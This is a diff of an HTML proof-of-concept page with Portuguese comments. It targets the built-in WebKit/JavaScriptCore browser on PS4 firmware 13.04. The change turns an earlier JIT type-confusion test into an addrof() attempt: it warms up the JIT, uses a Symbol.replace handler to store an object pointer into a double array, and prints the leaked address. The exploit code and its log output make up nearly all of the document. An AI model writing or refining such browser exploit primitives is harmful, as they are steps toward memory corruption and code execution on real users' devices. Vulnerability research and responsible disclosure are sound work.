@@ -1,36 +1,36 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PoC Confirmada — JIT Type Confusion (Symbol.replace)</title>
+<title>PoC #3 — Real addrof() via Unboxed Double Store</title>
 <style>
   body { font-family: monospace; background: #111; color: #eee; padding: 20px; }
-  h2 { color: #4af; }
-  pre { background: #1e1e1e; padding: 16px; border-left: 3px solid #4af; white-space: pre-wrap; }
+  h2 { color: #f44; }
+  pre { background: #1e1e1e; padding: 16px; border-left: 3px solid #f44; white-space: pre-wrap; }
   .ok    { color: #4f4; }
   .alert { color: #f44; font-weight: bold; }
   .info  { color: #aaa; }
   .warn  { color: #fa4; }
-  button { background: #4af; color: #000; border: none; padding: 10px 24px;
+  button { background: #f44; color: #fff; border: none; padding: 10px 24px;
            font-size: 14px; font-weight: bold; cursor: pointer; margin: 4px; }
   #log { margin-top: 10px; display: block; }
 </style>
 </head>
 <body>
 
-<h2>PoC Confirmada — JIT Type Confusion via Symbol.replace</h2>
+<h2>PoC #3 — Tentativa de addrof() Real</h2>
 <pre>
 Target   : PS4 Firmware 13.04 — Built-in WebKit/JSC browser
-Bug      : Bypass de coerção ToString() no fast-path do JIT.
-Status   : CONFIRMED — Primitivas A (Alloc) e B (Type Confusion) estáveis.
+Objetivo : Forçar a JIT a gravar um ponteiro de JSObject em um ArrayWithDouble,
+           permitindo a leitura do endereço de memória real do objeto.
 
-Esta versão contém apenas as vulnerabilidades validadas pelos Sanity Checks,
-excluindo o falso positivo de leitura OOB (Primitive C).
+AVISO    : Este teste pode causar um Kernel Panic ou travar a aba do navegador 
+           se o JIT emitir uma instrução de store inválida ou atingir memória não mapeada.
+           Isso é um sinal POSITIVO de corrupção de memória.
 </pre>
 
-<button onclick="runConfirmedExploit()">▶ EXECUTAR POC CONFIRMADA</button>
-<pre id="log">Pressione o botão para iniciar a exploração validada.</pre>
+<button onclick="runAddrofExploit()">▶ EXECUTAR ADDROF</button>
+<pre id="log">Pressione o botão para tentar vazar o ponteiro.</pre>
 
 <script>
 var log = document.getElementById('log');
@@ -46,14 +46,13 @@ function alert_(m){ line('alert', '[VULN]  ' + m); }
 function warn(m)  { line('warn',  '[WARN]  ' + m); }
 function sep()    { line('info',  '─'.repeat(60)); }
 
-var WARMUP = 60000;
+var WARMUP = 100000; // Aumentado para garantir FTL JIT tier
 
-// Gadget principal para Type Confusion
 function buildGadget(phase, payloadRef) {
   return {
     [Symbol.replace]: function(str) {
       if (phase[0] === 'warmup') return str; 
-      return payloadRef[0]; // Retorna objeto direto no ataque
+      return payloadRef[0]; 
     }
   };
 }
@@ -62,9 +61,26 @@ function strLen(s, handler) {
   return s.replace(handler, '').length;
 }
 
-async function runConfirmedExploit() {
+// O coração do exploit: a JIT compilará isso presumindo que 'arr' é ArrayWithDouble
+// e que strLen retorna um double nativo.
+function storeConfusedType(base, handler, arr) {
+  arr[0] = strLen(base, handler);
+}
+
+// Utilitário para ler doubles como hex (formato IEEE-754)
+function doubleToHex(d) {
+  var buf = new ArrayBuffer(8);
+  var f64 = new Float64Array(buf);
+  var u32 = new Uint32Array(buf);
+  f64[0] = d;
+  var high = u32[1].toString(16).padStart(8, '0');
+  var low = u32[0].toString(16).padStart(8, '0');
+  return "0x" + high + low;
+}
+
+async function runAddrofExploit() {
   log.textContent = '';
-  info('=== INICIANDO EXPLORAÇÃO JIT CONFIRMADA ===');
+  info('=== INICIANDO TENTATIVA DE ADDROF ===');
   sep();
 
   var phase = ['warmup'];
@@ -72,60 +88,67 @@ async function runConfirmedExploit() {
   var handler = buildGadget(phase, payload);
   var base = 'test string';
 
-  info('Realizando warmup JIT (' + WARMUP + ' iterações)...');
-  for (var w = 0; w < WARMUP; w++) strLen(base, handler);
-  info('Warmup concluído. JIT otimizou a função strLen para retornar Number.');
-  sep();
+  // Target array: inicializado exclusivamente com doubles para forçar
+  // o JSC a usar a estrutura ArrayWithDouble internamente.
+  var targetArr = [1.111, 2.222, 3.333, 4.444];
 
-  // --- Check 1: Validação da Primitiva A (Bypass de ToString) ---
-  info('--- Passo 1: Comprovação do Bypass de ToString() ---');
-  payload[0] = {
-    toString: function() { return "ABC"; }, // length correto seria 3
-    length: 99999                           // JIT vai ler isso direto
-  };
-  phase[0] = 'attack';
-  var coercionResult = strLen(base, handler);
-  phase[0] = 'warmup';
-
-  info('Resultado obtido: ' + coercionResult);
-  if (coercionResult === 99999) {
-    alert_('VULNERABILIDADE CONFIRMED: Motor leu .length diretamente (99999).');
-    alert_('A coerção obrigatória ToString() foi ignorada pela JIT.');
-  } else {
-    warn('Falha na primitiva. O resultado foi: ' + coercionResult);
+  info('1. Realizando JIT Warmup agressivo (' + WARMUP + ' iterações)...');
+  for (var w = 0; w < WARMUP; w++) {
+    storeConfusedType(base, handler, targetArr);
+  }
+  info('Warmup concluído.');
+  info('Estado do targetArr[0] após warmup: ' + targetArr[0]);
+  
+  if (targetArr[0] !== 11) { // 'test string'.length == 11
+      warn('Falha no warmup: targetArr não recebeu o número esperado.');
+      return;
   }
 
   sep();
-  // --- Check 2: Estabilidade e Type Confusion (Primitiva B) ---
-  info('--- Passo 2: Teste de Estabilidade e Type Confusion ---');
-  payload[0] = { toString: function(){ return "X"; }, length: 777 }; 
+  info('2. Iniciando Attack Phase...');
+  
+  // Objeto vítima que queremos descobrir o endereço na memória
+  var victimObject = { magic: 0x1337BEEF, marker: "LEANDRO_H1" };
+  payload[0] = victimObject;
   phase[0] = 'attack';
   
-  let successes = 0;
-  let deopts = 0;
-  
-  for(let i = 0; i < 100; i++) {
-    let res = strLen(base, handler);
-    if (res === 777) successes++;
-    else deopts++;
+  try {
+    storeConfusedType(base, handler, targetArr);
+  } catch(e) {
+    warn('A engine lançou uma exceção ou travou: ' + e.message);
+    warn('O JIT inseriu um type guard de última hora. Primitiva falhou.');
+    return;
   }
+  
   phase[0] = 'warmup';
-  
-  info('Retornou fake length (777): ' + successes + ' vezes');
-  info('Retornou fallback seguro    : ' + deopts + ' vezes');
-  
-  if (successes === 100) {
-    alert_('VULNERABILIDADE CONFIRMED: A primitiva é 100% estável.');
-    alert_('Type Confusion mantida na JIT. Nenhum deopt/bailout ocorreu.');
-  } else if (successes > 0) {
-    warn('A primitiva funcionou, mas é instável (' + deopts + ' deopts).');
-  }
 
   sep();
-  info('=== RESUMO PARA REPORT ===');
-  ok('Primitiva A (Alocação controlada) e Primitiva B (Object Passthrough) validadas.');
-  ok('O motor JS omite a conversão ToString em otimizações JIT');
-  ok('de String.prototype.replace, resultando em Type Confusion contínua.');
+  info('3. Analisando a memória corrompida...');
+  
+  var leakedDouble = targetArr[0];
+  info('Valor float cru lido do array: ' + leakedDouble);
+  info('Tipo JS lido do array: ' + typeof leakedDouble);
+
+  if (typeof leakedDouble === 'object') {
+      warn('O motor detectou a transição de tipo e reverteu o array para ArrayWithContiguous.');
+      warn('O objeto foi salvo de forma segura. Nenhuma corrupção ocorreu.');
+      return;
+  }
+
+  if (leakedDouble === 11 || isNaN(leakedDouble)) {
+      warn('A gravação falhou, resultou em NaN, ou não alterou o array.');
+      return;
+  }
+
+  // Se chegarmos aqui e o typeof for 'number', temos os bits!
+  var leakedHex = doubleToHex(leakedDouble);
+  alert_('VULNERABILIDADE CRÍTICA CONFIRMADA!');
+  alert_('O JIT gravou o ponteiro do objeto como um float cru no array.');
+  alert_('Endereço vazado (com possível NaN-boxing): ' + leakedHex);
+  
+  info('');
+  info('O valor acima contém o ponteiro JSValue do objeto na memória do PS4.');
+  info('Dependendo da arquitetura (NaN-boxing), você pode precisar subtrair a máscara.');
 }
 </script>
 </body>
